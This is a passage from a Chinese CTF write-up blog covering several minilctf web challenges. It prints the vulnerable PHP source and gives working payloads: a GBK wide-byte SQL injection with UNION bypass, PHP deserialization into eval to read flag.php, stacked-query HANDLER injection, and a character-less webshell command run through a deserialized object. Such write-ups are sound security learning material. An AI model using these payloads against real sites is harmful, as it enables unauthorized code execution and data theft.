+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-number">0</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$weight</span>=<span class="hljs-number">0</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$height</span>=<span class="hljs-number">0</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$serialize</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">if</span>(is_numeric(<span class="hljs-keyword">$this</span>-&gt;serialize))&#123;
+            <span class="hljs-keyword">$this</span>-&gt;serialize++;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
+        @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$s=&quot;&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;serialize.<span class="hljs-string">&#x27;&quot;;&#x27;</span>);
+    &#125;
+&#125;
+
+<span class="hljs-comment">#login.php</span>
+<span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;connection.php&quot;</span>;
+    mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;SET CHARACTER SET &#x27;gbk&#x27;&quot;</span>);
+
+    <span class="hljs-variable">$username</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);
+    <span class="hljs-variable">$password</span>=addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);
+    <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$username</span>))&#123;
+        <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;please post your username&#x27;</span>;
+    &#125;
+    <span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;
+        <span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;
+            <span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);
+        &#125;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$row</span>))&#123;
+            <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;you are not reclu3e&#x27;</span>;
+        &#125;
+        <span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>]!==<span class="hljs-variable">$password</span>)&#123;
+                <span class="hljs-variable">$msg</span>=<span class="hljs-string">&#x27;I know you are reclu3e but you need post the right password&#x27;</span>;
+            &#125;
+            <span class="hljs-keyword">else</span>&#123;
+                session_start();
+                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$username</span>;
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;Yes! you are reclu3e&quot;)&lt;/script&gt;&#x27;</span>;
+            &#125;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$msg</span>))&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">$msg</span>&#x27;)&lt;/script&gt;&quot;</span>;
+    &#125;
+    <span class="hljs-variable">$conn</span>-&gt;close();
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script type=&#x27;text/javascript&#x27;&gt;&quot;</span>;  
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;window.location.href=&#x27;index.php&#x27;&quot;</span>;  
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/script&gt;&quot;</span>;  
+
+</code></pre>
+
+<p>明显login.php有宽字节注入,切password是拿出来单独验证，所以这里用union绕一下</p>
+<p>payload:<code>username=%df%27 union select 1,1#&amp;password=1</code></p>
+<p>然后又是玩烂了的反序列化了，23333 ，flag在flag.php里</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">person</span></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> =<span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> =<span class="hljs-number">0</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$weight</span>=<span class="hljs-number">0</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$height</span>=<span class="hljs-number">0</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$serialize</span>=<span class="hljs-string">&#x27;1&quot;;?&gt;&lt;?php show_source(&quot;flag.php&quot;);?&gt;&#x27;</span>;
+
+&#125;
+
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> person();
+<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);
+
+ps:wakeup不用绕，也绕不了 xs</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/16/Y6jtkd.png" srcset="/img/loading.gif" alt="Y6jtkd.png"></p>
+<h1 id="id-wife"><a href="#id-wife" class="headerlink" title="id_wife"></a>id_wife</h1><p>随便注换了一个前端，但是看到了西电大师傅的靓照 血赚</p>
+<pre><code class="hljs sql">id=w1nd&#x27;);<span class="hljs-keyword">handler</span> <span class="hljs-string">`1145141919810`</span> <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> yun;<span class="hljs-keyword">handler</span> yun <span class="hljs-keyword">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-keyword">handler</span> yun <span class="hljs-keyword">read</span> <span class="hljs-keyword">next</span>;</code></pre>
+
+
+
+<h1 id="p"><a href="#p" class="headerlink" title="p"></a>p</h1><p>第一层改序列化得源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;classes.php&#x27;</span>;
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;git&#x27;</span>])) &#123;
+    ob_start();
+    setcookie(<span class="hljs-string">&#x27;git&#x27;</span>, base64_encode(serialize(<span class="hljs-keyword">new</span> gitee(<span class="hljs-string">&#x27;index.php&#x27;</span>))));
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;location.reload()&lt;/script&gt;&#x27;</span>;
+    ob_end_flush();
+    <span class="hljs-keyword">die</span>();
+&#125;
+<span class="hljs-variable">$comp</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;git&#x27;</span>]));
+highlight_file(<span class="hljs-variable">$comp</span>-&gt;file);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;</code></pre>
+
+
+
+<p><code>setcookie(&#39;git&#39;, base64_encode(serialize(new gitee(&#39;index.php&#39;))));</code>,我们可以在cookie中base64后看序列化后的数据</p>
+<pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;gitee&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;index.php&quot;</span>;&#125;
+<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span> 改成<span class="hljs-selector-tag">class</span><span class="hljs-selector-class">.php</span>就可以看到<span class="hljs-selector-tag">classes</span><span class="hljs-selector-class">.php</span>的源码
+<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;gitee&quot;</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;classes.php&quot;</span>;&#125;</code></pre>
+
+<p>第二层 无字符webshell</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gitee</span> </span>&#123;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;你用上了Git，可是，代价是什么呢（悲）&#x27;</span>;
+    &#125;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span></span>) </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$f</span>;
+    &#125;
+&#125;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">github</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;cmd))
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cerror&quot;</span>);
+        <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;~!@#%^&amp;*()（）-_&#123;&#125;[]&#x27;\&quot;:,&quot;</span>;
+        <span class="hljs-keyword">foreach</span>(str_split(<span class="hljs-variable">$blacklist</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$char</span>;
+            <span class="hljs-keyword">if</span>(strchr(<span class="hljs-keyword">$this</span>-&gt;cmd, <span class="hljs-variable">$char</span>) !== <span class="hljs-literal">false</span>) 
+                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;serror&#x27;</span>);
+        &#125;
+        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;cmd);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;HTTP_X_REAL_IP&quot;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;
+            <span class="hljs-comment">// proxy_set_header X-Real-IP $remote_addr;</span>
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;across the great ... nope&#x27;</span>);
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>payload:</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">github</span> </span>&#123;
+<span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&#x27;</span>;
+<span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;index.php&quot;</span>;
+&#125;
+
+<span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> github());
+</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/16/Y6HBOH.png" srcset="/img/loading.gif" alt="Y6HBOH.png"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/minilctf/">minilctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/19/bypass-open-basedir/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">bypass open_basedir</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/">
+                        <span class="hidden-mobile">2020网鼎杯</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
